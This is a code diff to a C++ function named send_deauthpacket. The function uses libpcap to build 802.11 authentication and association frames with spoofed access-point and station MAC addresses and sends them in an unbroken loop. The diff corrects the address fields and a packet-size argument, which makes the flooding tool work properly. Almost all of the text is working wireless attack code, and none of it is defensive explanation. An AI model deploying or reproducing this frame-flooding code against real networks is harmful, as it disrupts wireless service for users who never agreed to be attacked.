@@ -30,6 +30,9 @@ int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
     packet.auth.fc = 0xb0;
     packet.auth.dur = 0x00;
     packet.auth.seq = 0x00;
+    packet.auth.dest = Mac(apmac);
+    packet.auth.source = Mac(stmac);
+    packet.auth.bssid = Mac(apmac);
     packet.wireless.auth_algorithm = 0x00;
     packet.wireless.auth_seq = 0x01;
     packet.wireless.status = 0x00;
@@ -49,18 +52,18 @@ int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
     packet2.assoc.fc = 0x01;
     packet2.assoc.dur = 0x00;
     packet2.assoc.seq = 0x00;
+    packet2.assoc.dest = Mac(apmac);
+    packet2.assoc.source = Mac(stmac);
+    packet2.assoc.bssid = Mac(apmac);
     packet2.wireles.cap = 0x00;
 
     while (true) {
-            packet.auth.dest = Mac(stmac);
-            packet.auth.source = Mac(apmac);
-            packet.auth.bssid = Mac(apmac);
             int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(authpacket));
             if (res != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 break;
             }
-            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet2), sizeof(authpacket));
+            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet2), sizeof(assocpacket));
             if (res2 != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 break;
